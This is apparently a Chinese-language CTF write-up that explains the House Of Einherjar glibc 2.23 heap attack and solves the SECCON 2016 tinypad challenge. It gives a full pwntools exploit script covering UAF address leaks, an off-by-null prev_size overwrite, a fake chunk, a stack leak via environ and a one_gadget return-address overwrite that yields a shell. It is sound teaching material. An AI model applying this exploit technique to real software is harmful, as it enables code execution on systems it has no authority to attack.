> 原文链接: https://www.anquanke.com//post/id/251596 


# PWN——House Of Einherjar CTF Wiki例题详解


                                阅读量   
                                **18772**
                            
                        |
                        
                                                                                    



[![](https://p1.ssl.qhimg.com/t010e70e2d2f976eb58.png)](https://p1.ssl.qhimg.com/t010e70e2d2f976eb58.png)



## 0x00 写在前面
1. 主要内容：解释House Of Einherjar的攻击原理，并对CTF Wiki中PWN的House Of Einherjar部分的例题使用House Of Einherjar方法的解法做详细说明
1. 题目链接：https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-einherjar/2016_seccon_tinypad
1. 参考链接：https://wiki.x10sec.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-einherjar/
1. 有话要说：House Of Einherjar是一种功能强大的堆攻击方式，但CTF Wiki中并没有对该攻击方式的例题与脚本出详细解释。为了方便大家的学习，我将用我自己写的脚本对本题目做出详细解答。
本文章均使用64位程序进行解释。

本攻击方式适用于libc.2-23.so的链接库



## 0x01 什么是House Of Einherjar？

House Of Einherjar是通过利用堆本身存在的溢出漏洞，通过修改、构造堆块的结构欺骗程序来实现让malloc分配几乎任意一个地址的chunk。从而实现任意地址控制的攻击方式。

我们来看一个例子，假设下面有三个堆块分布如下，并且有一个我们想要程序返回chunk的地址在堆块上方：

[![](https://p4.ssl.qhimg.com/t01267b7f45abc8bfca.png)](https://p4.ssl.qhimg.com/t01267b7f45abc8bfca.png)

```
/* consolidate backward */
if (!prev_inuse(p)) `{`
prevsize = prev_size(p);
size += prevsize;
p = chunk_at_offset(p, -((long) prevsize));
unlink(av, p, bck, fwd);
`}`
```

如果我们通过漏洞将chunk2的prev_size位控制，并且将chunk2的prev_inuse位控制为\x00，那么在free(chunk2)时程序发现chunk2的prev_inuse位为0，就会发生后向合并。

程序会根据chunk2的prev_size位(由我们控制)去寻找它前面的假堆块，并且对该假堆块进行unlink操作，将假堆块和chunk2合并放回unsorted bin中。如果成功绕过了unlink保护，那么我们就可以将一个我们想要控制的地址放入unsorted bin中了。

我们需要绕过的unlink的保护有：

```
// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)
if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \
malloc_printerr ("corrupted size vs. prev_size");


// 检查 fd 和 bk 指针(双向链表完整性检查)
if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \
malloc_printerr (check_action, "corrupted double-linked list", P, AV);
```

对于第一个保护，我们可以通过构造target_addr处的值来进行绕过，只需要在target_addr + 0x8处构造一个fake_size(prev_inuse设置为1)，并且在target_addr + fake_size处写入fake_size来冒充fake_chunk的nextchunk的prev_size域即可绕过保护。例子如下：

注意，fake_chunk’s nextchunk根本就不是一个chunk，它既不是我们构造的假chunk，也不是原来真实存在的chunk，它仅仅是一个unlink后向合并检查的数据地址罢了

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01d525a22d09ff0bfc.png)

这样，我们绕过了第一个保护。然后我们来绕过第二个保护：将target_addr(fake_chunk)的下一行的两处写入target_addr的地址，即可绕过unlink的第二个保护。

第二个保护执行后的堆块分布：

[![](https://p5.ssl.qhimg.com/t01747e983fc88deacf.png)](https://p5.ssl.qhimg.com/t01747e983fc88deacf.png)

这样，我们就能成功free(chunk2)后将fake_chunk与chunk2合并到unsorted bin中。

接下来，我们需要将chunk2申请回来，申请回来时需要绕过另一个保护，把我们原来写入的一行target_addr的地址换成main_arena + 88(unsorted bin中只有一个堆块时fd和bk都需要指向main_arena + 88的位置)，否则分配时会发生内存异常。

成功Free后，我们将堆块改写成这样：

[![](https://p0.ssl.qhimg.com/t01e781eab4cb1bb70e.png)](https://p0.ssl.qhimg.com/t01e781eab4cb1bb70e.png)

这样我们再malloc一个(0xf8)大小的堆块时，程序就会返回我们的fake_chunk给我们了。这就是House Of Einherjar的一个用法。

House Of Einherjar的本例中需要满足的条件：
1. 我们的target_addr是可控的，我们需要在上面构造fake_chunk并绕过unlink和unsorted bin的保护。
1. 我们需要知道target_addr和chunk之间的地址偏移，用来写入prev_size位。
1. 我们需要有溢出漏洞来改写chunk的prev_inuse位。
1. 至于chunk的prev_size位，我们可以通过申请(0x*f8)大小的堆块来直接使用chunk的prev_size位，不需要利用漏洞，因为堆块之间的prev_size位是共用的。


## 0x02 程序分析与注意事项

先请读者下载题目并且用反编译软件阅读程序的大致流程，题目链接在文章起始处,CTF Wiki上也有程序的链接。

程序的保护：没有开启PIE。全局变量和代码段位置固定

[![](https://p3.ssl.qhimg.com/t01888a7d33fadc0993.png)](https://p3.ssl.qhimg.com/t01888a7d33fadc0993.png)

程序的独有数据结构：tinypad

tinypad的结构如下图所示：

[![](https://p0.ssl.qhimg.com/t017591ad5a44994359.png)](https://p0.ssl.qhimg.com/t017591ad5a44994359.png)

tinypad的前256字节是数据缓冲区，是用来存储用户edit操作时的数据的，从256字节开始，分别存储四个堆块的大小和地址。

下面介绍程序几大功能：

1、程序有alloc功能，但是最多只能alloc4个堆块。在alloc过程中是用read对堆块内容直接进行写入的，所以alloc时可以任意写入堆块的数据。alloc最大大小为0x100字节。

2、程序有edit功能，但edit在读入chunk的数据时，会先计算len = strlen(chunk)，然后再向tinypad缓冲区部分读入长度为len的数据，然后再将数据通过strcpy拷贝回原来的chunk中。edit功能比较重要，它不仅可以改变chunk中的内容，还可以改变tinypad缓冲区的内容。我们把tinypad附近的地址当成target_addr时，edit功能也可以用来构造fake_chunk，这样可以让malloc返回tinypad附近的值给我们。但是

edit函数也有缺陷，缺陷在于堆块不可以写入比以前strlen还长的数据(因为以len长度为上限，只能读取len个字节)。edit操作先将数据写入tinypad的缓冲区中，这一步是用read实现的，所以说我们将数据写入tinypad时是可以任意写入的。但是拷贝回原堆块时，使用strcpy实现的，会有\x00截断。所以数据中如果有\x00，则不能在\x00后写入数据了。

edit的部分代码如下：

[![](https://p3.ssl.qhimg.com/t0110d381f3e716fa7c.png)](https://p3.ssl.qhimg.com/t0110d381f3e716fa7c.png)

3、程序有show功能，程序每执行一次操作后都会自动打印出4个堆块的内容。

4、程序有delete功能，但是delete后没有对堆块指针赋空值，蹲在UAF的漏洞，我们可以利用这一点与show功能快速泄露libc和heap的地址。

注意事项：edit函数并不一定是要向堆块中写入数据，也有可能是为了向tinypad中写入数据。当edit函数中存在\x00后的数据时(例如p64(0) + p64(0x602040))，就是为了向tinypad中写入数据。这一点很重要，会对exp的理解有很大帮助。本题的index是从1开始的，而不是0。



## 0x03 开始写exp

为了讲解方便，我将程序的libc重定向为我glibc-all-in-one中下载的libc.2-23.so版本，可以看到调试过程中的程序结构。

根据程序的功能，先def几个函数便于操作，并且把one_gadget找到：

[![](https://p5.ssl.qhimg.com/t010e7a36d03130516d.png)](https://p5.ssl.qhimg.com/t010e7a36d03130516d.png)

```
from pwn import *
p = process("./tinypad")
libc = ELF("/home/wbohan/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so")
context.log_level = 'debug'
one_gadget = [0x45226,0x4527a,0xf03a4,0xf1247]

def alloc(size, content):
p.recvuntil("(CMD)&gt;&gt;&gt; ")
p.sendline("A")
p.recvuntil("(SIZE)&gt;&gt;&gt; ")
p.sendline(str(size))
p.recvuntil("(CONTENT)&gt;&gt;&gt; ")
p.sendline(content)

def delete(index):
p.recvuntil("(CMD)&gt;&gt;&gt; ")
p.sendline("D")
p.recvuntil("(INDEX)&gt;&gt;&gt; ")
p.sendline(str(index))

def edit(index, content):
p.recvuntil("(CMD)&gt;&gt;&gt; ")
p.sendline("E")
p.recvuntil("(INDEX)&gt;&gt;&gt; ")
p.sendline(str(index))
p.recvuntil('CONTENT: ')
retstr = p.recvuntil('\n')
p.recvuntil("(CONTENT)&gt;&gt;&gt; ")
p.sendline(content)
p.recvuntil("(Y/n)&gt;&gt;&gt; ")
p.sendline('Y')
return retstr
```



## 0x04 地址泄露

通过利用UAF漏洞，我们可以直接泄露heap和libc的地址。首先申请两个fastbin大小的堆块(index 1,index 2)，然后申请一个不是fastbin大小的堆块(index 3)，最后申请一个堆块(index 4)用于隔断top chunk。

对index2进行释放，然后再对index1进行释放，这样index2的地址就会存储在index1的fd中(fastbin)，我们就可以得到index2的堆块地址。

然后释放index3，由于index3不是fastbin大小的堆块，会被程序放入unsortedbin中。这个堆块的fd和bk都会存储main_arena + 88,这样就能得到heap和libc地址了。最后把index4释放掉，便于我们重新分配堆块。

```
#1 leak heap addr and libc addr
alloc(0x40,'a')#idx1
alloc(0x40,'b')#idx2
alloc(0x80,'c')#idx3
alloc(0x18,'d')#idx4


delete(2)#fastbin
delete(1)#fastbin
delete(3)#unsorted bin
delete(4)
p.recvuntil('CONTENT: ')
buf_addr = u64(p.recvuntil('\n',drop = True).ljust(8,'\x00'))#堆块1的内容
p.recvuntil('CONTENT: ')
p.recvuntil('CONTENT: ')
libc_base = u64(p.recvuntil('\n',drop = True).ljust(8,'\x00')) - 0x7f8c12b7ab78 + 0x7f8c127b6000 #堆块3的内容是main_arena + 88,根据它与libc之间的偏移算出libc的基址
main_arena_88 = libc_base + 0x7f8c12b7ab78 - 0x7f8c127b6000
```

这样，我们就很轻松地得到了heap地址和libc地址。



## 0x05 构造House Of Einherjar

得到了heap地址和libc地址之后，我们也得到了one_gadget的地址，下面我们需要将我们的one_gadget写到程序可以运行的地方去。我们可以通过改写tinypad中存储的堆块指针然后edit来实现任意地址写数据的目的。这要求我们需要控制tinypad的存储堆块指针那片区域中的内容。如果我们可以把tinypad中存储的堆块指针覆写，并且指向程序可以运行到的地方，比如将堆块指针覆写为main函数的返回地址处，修改返回地址为one_gadget，我们就可以让程序返回时拿到shell了。但是tinypad通过正常读写的方式只能影响到前256个字节，如果要影响后面的字节，需要在tinypad上做一个fake_chunk出来。由于我们fake_chunk可写的大小也是0x100(因为alloc的大小最大就是0x100)，所以我们不能把fake_chunk构造到tinypad的头部，而是要把它构造在tinypad数据缓冲区的中间(我将fake_chunk的其实地址改写到&amp;tinypad + 0x20处，即tinypad数据缓冲区下两行处。)

下图是我们将要构造的fake_chunk位置解释：

回顾0x01中，House Of Einherjar的利用要求，我们是否满足了要求？

House Of Einherjar的本例中需要满足的条件：
1. 我们的target_addr是可控的，我们需要在上面构造fake_chunk并绕过unlink和unsorted bin的保护。
1. 我们需要知道target_addr和chunk之间的地址偏移，用来写入prev_size位。
1. 我们需要有溢出漏洞来改写chunk的prev_inuse位。
1. 至于chunk的prev_size位，我们可以通过申请例如0x18,0x28,0x38大小的堆块来直接使用chunk的prev_size位，不需要利用漏洞，因为堆块之间的prev_size位是共用的。
第一点，我们的target_addr是可以用edit来进行控制的，因为edit功能会先在tinypad上写数据。

第二点，地址偏移也是我们知道的，程序没有PIE保护，tinypad的地址就是0x602040，堆块地址我们已经泄露出来了

第三点，有一个比较明显的off by one的漏洞(off by null),如前面所说，edit函数通过strcpy的方式来讲我们的输入拷贝回原来的堆块的。如果我们申请一个大小为0x18的堆块chunk1，将它用字母a全部填充满,紧贴着在它后面申请一个大小为0xf0的chunk2，然后对chunk1进行edit操作，再输入0x18个字母a回去。chunk2的prev_size位就被覆盖为0x00了。

第四点，我们可以对chunk1进行edit操作来对chunk2的prev_size位进行修改。这里需要注意的是，edit函数使用strcpy实现堆块修改的，strcpy遇到\x00会截断，所以一次只能修改一个字节为\x00。

chunk1中我们全部写入了字母a，最后的8个字母a需要被我们改写成OFFSET。我们需要写入多个\x00，这就说明我们需要执行多次edit操作来写入OFFSET。

第三点这一个过程的演示入下：

首先，chunk1 = malloc(0x18)，将chunk1全部填充为’a’。然后执行chunk2 = malloc(0xf0)。此时的堆块内容如图所示：

[![](https://p2.ssl.qhimg.com/t0145c557cc13b931be.png)](https://p2.ssl.qhimg.com/t0145c557cc13b931be.png)

然后，对chunk1进行edit操作，输入0x18个‘a’回去，此时堆块内容如图所示：

[![](https://p0.ssl.qhimg.com/t01ad125cd8fa91d0c2.png)](https://p0.ssl.qhimg.com/t01ad125cd8fa91d0c2.png)

最后我们就可以把OFFSET写入chunk2的prev_size位了。然后我们就可以去构造fake_chunk了。

```
offset = buf_addr + 0x100 - 0x602060
alloc(0x18,'e' * 0x18)#idx1
alloc(0xf0,'e' * 0xf0)#idx2
alloc(0x100,'f' * 0xf8)#idx3
alloc(0x100,'g' * 0x100)#idx4
edit(1,'a' * 0x18) #覆盖idx2的preinuse
len_of_zero = (18 - len(str(hex(offset))))/2 #需要覆盖的0的个数
for i in range(len_of_zero):
edit(1,'a' * (0x17 - i))
edit(1,'a' * 0x10 + p64(offset))
```

构造fake_chunk时，我们需要向tinypad中写入数据。就需要利用到edit功能来先向tinypad的数据缓冲区中写入数据。根据再0x01中提到的方法，这里不再赘述，直接给予代码和注释。

```
fake_chunk = 'd' * 0x20 + p64(0) + p64(0x101) + p64(0x602060) * 2 #构造fake_chunk到0x602060.绕过unlink第二个保护
edit(2,fake_chunk)#write fake_chunk to tinypad
delete(2) #我们不需要构造fakechunk's nextchunk的size位来绕过第一个保护,因为通过计算，这个需要我们构造的地方的值是chunk2的size，恰好就是0x100，所以不需要修改，也可以绕过unlink第一个保护
payload2 = 'd' * 0x20 + p64(0) + p64(0x101) + p64(main_arena_88) * 2
edit(4,payload2)#成功free后，需要把合并后的堆块fd和bk修改为main_arena + 88
```

当我们再申请一个0xf8大小的堆块时，程序就会把tinypad+0x20处的地址返回给我们了。我们就可以修改从tinypad+0x20开始，0x100大小的数据，tinypad+0x100处存储了第一个堆块的size和ptr，tinypad+0x110处存储了第二个堆块的size和ptr。这两个堆块的ptr我们已经可以进行修改了。

由于malloc_hook处的值是0，我们无法通过edit的方式把onegadget写入malloc_hook(因为malloc_hook的strlen是0，无法读入数据)。那么我们就可以通过修改函数的返回地址为onegadget。

修改函数的返回地址需要把程序保存返回地址的位置的值修改掉。我们需要泄露栈地址。libc中有一个符号’environ’存储了栈中的一个地址。我们可以利用它来得到栈地址。

将chunk1的地址改成environ的地址，目的是通过show得到environ中的数据(一个栈地址)。将chunk2的地址改成保存chunk1的地址处的地址(0x602148)，目的是方便修改chunk1的指针值。

```
environ_addr = libc_base + libc.sym['__environ']#得到environ的地址
payload3 = 'a' * 0xd0 + p64(0x18) + p64(environ_addr) + p64(0x100) + p64(0x602148)
alloc(0x100 - 8,payload3)#idx2，得到tinypad+0x20处的fake_chunk,并构造堆块上的内容，覆盖chunk1和chunk2的ptr
p.recvuntil('CONTENT: ')
stack_addr = u64(p.recvuntil('\n',drop = True).ljust(8,'\x00'))#得到environ中的栈地址
ret_addr = stack_addr + 0x7ffd2bad3188 - 0x7ffd2bad3278#得到返回地址，这个偏移可以通过调试获得。
log.success('stack_addr: %s' % hex(stack_addr))
one_gadget_addr = libc_base + one_gadget[0]#onegadget地址
```



## 0x06 漏洞利用

到了最后一步了，我们获得了函数的返回地址ret_addr，刚才我们申请fake_chunk是修改了chunk1和chunk2的指针，chunk2中保留的是0x602148，正好是存储chunk1的指针的地方。因为libc和栈的其实地址一般都是0x7f，并且长度都是12个16进制数。所以这里我们可以直接通过edit chunk2来修改chunk1的指针为ret_addr。最后再edit chunk1，将返回地址处保留的值改成one_gadget。返回地址处原先保留的值也是一个以0x7f开头，长度是12个16进制数的地址。所以这里edit函数也可以实现我们想要的功能，不会因为长度问题截断。

全部写好后，我们输入Q，让程序退出，就能拿到shell了。

```
edit(2,p64(ret_addr))#修改chunk1的指针为ret_addr
edit(1,p64(one_gadget_addr))#将ret_addr中的值改成one_gadget
p.recvuntil('(CMD)&gt;&gt;&gt; ')
p.sendline('Q')#程序退出，获得shell
p.interactive()#进行交互操作
```

最后脚本执行的结果：

## [![](https://p0.ssl.qhimg.com/t017ccd1b91fee65e61.png)](https://p0.ssl.qhimg.com/t017ccd1b91fee65e61.png)



## 0x07 个人心得

这道题目我从开始到解出再到写完文章花了两天的时间，里面穿插了很多保护绕过的技术。通过不断的调试，不断分析问题才最后靠自己解出这道题目。这道题目加深了我对堆保护技术绕过的印象，也让我知道了一种可以泄露栈地址的方法，同时也加深了unlink的各种操作的理解。（这两天我还去复习了unlink的各种合并检查操作）。总之，堆是pwn的基础，打好基础，熟练掌握各种攻击方式，才能在比赛中熟练综合运用。

如果exp尝试失败，可能是环境原因，也有可能是堆的地址含有\x00被截断了。前者可以自行调试环境，后者可以多尝试几次。



## 0x08 exp

```
from pwn import *

p = process("./tinypad")
libc = ELF("/home/wbohan/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so")
context.log_level = 'debug'
one_gadget = [0x45226,0x4527a,0xf03a4,0xf1247]

def alloc(size, content):
p.recvuntil("(CMD)&gt;&gt;&gt; ")
p.sendline("A")
p.recvuntil("(SIZE)&gt;&gt;&gt; ")
p.sendline(str(size))
p.recvuntil("(CONTENT)&gt;&gt;&gt; ")
p.sendline(content)

def delete(index):
p.recvuntil("(CMD)&gt;&gt;&gt; ")
p.sendline("D")
p.recvuntil("(INDEX)&gt;&gt;&gt; ")
p.sendline(str(index))

def edit(index, content):
p.recvuntil("(CMD)&gt;&gt;&gt; ")
p.sendline("E")
p.recvuntil("(INDEX)&gt;&gt;&gt; ")
p.sendline(str(index))
p.recvuntil('CONTENT: ')
retstr = p.recvuntil('\n')
p.recvuntil("(CONTENT)&gt;&gt;&gt; ")
p.sendline(content)
p.recvuntil("(Y/n)&gt;&gt;&gt; ")
p.sendline('Y')
return retstr

#1 leak heap addr and libc addr
alloc(0x40,'a')#idx1
alloc(0x40,'b')#idx2
alloc(0x80,'c')#idx3
alloc(0x18,'d')#idx4

delete(2)#fastbin
delete(1)#fastbin
delete(3)#unsorted bin
delete(4)
p.recvuntil('CONTENT: ')
buf_addr = u64(p.recvuntil('\n',drop = True).ljust(8,'\x00'))
p.recvuntil('CONTENT: ')
p.recvuntil('CONTENT: ')
libc_base = u64(p.recvuntil('\n',drop = True).ljust(8,'\x00')) - 0x7f8c12b7ab78 + 0x7f8c127b6000
main_arena_88 = libc_base + 0x7f8c12b7ab78 - 0x7f8c127b6000
log.success('buf_addr: %s' % hex(buf_addr))
log.success('libc_base: %s' % hex(libc_base))
#gdb.attach(p)
#pause()
#2
offset = buf_addr + 0x100 - 0x602060
log.success('offset: %s' % hex(offset))
alloc(0x18,'e' * 0x18) #idx1
alloc(0xf0,'e' * 0xf0)#idx2
alloc(0x100,'f' * 0xf8)#idx3
alloc(0x100,'g' * 0x100)#idx4

len_of_zero = (18 - len(str(hex(offset))))/2
edit(1,'a' * 0x18)#idx2 preinuse
for i in range(len_of_zero):
edit(1,'a' * (0x17 - i))
edit(1,'a' * 0x10 + p64(offset))

fake_chunk = 'd' * 0x20 + p64(0) + p64(0x101) + p64(0x602060) * 2
edit(2,fake_chunk)#write fake_chunk to tinypad
delete(2)
payload2 = 'd' * 0x20 + p64(0) + p64(0x101) + p64(main_arena_88) * 2
edit(4,payload2)


environ_addr = libc_base + libc.sym['__environ']
payload3 = 'a' * 0xd0 + p64(0x18) + p64(environ_addr) + p64(0x100) + p64(0x602148)
alloc(0x100 - 8,payload3)#idx2
p.recvuntil('CONTENT: ')
stack_addr = u64(p.recvuntil('\n',drop = True).ljust(8,'\x00'))
ret_addr = stack_addr + 0x7ffd2bad3188 - 0x7ffd2bad3278
log.success('stack_addr: %s' % hex(stack_addr))
one_gadget_addr = libc_base + one_gadget[0]


edit(2,p64(ret_addr))
edit(1,p64(one_gadget_addr))
p.recvuntil('(CMD)&gt;&gt;&gt; ')
p.sendline('Q')
p.interactive()
```
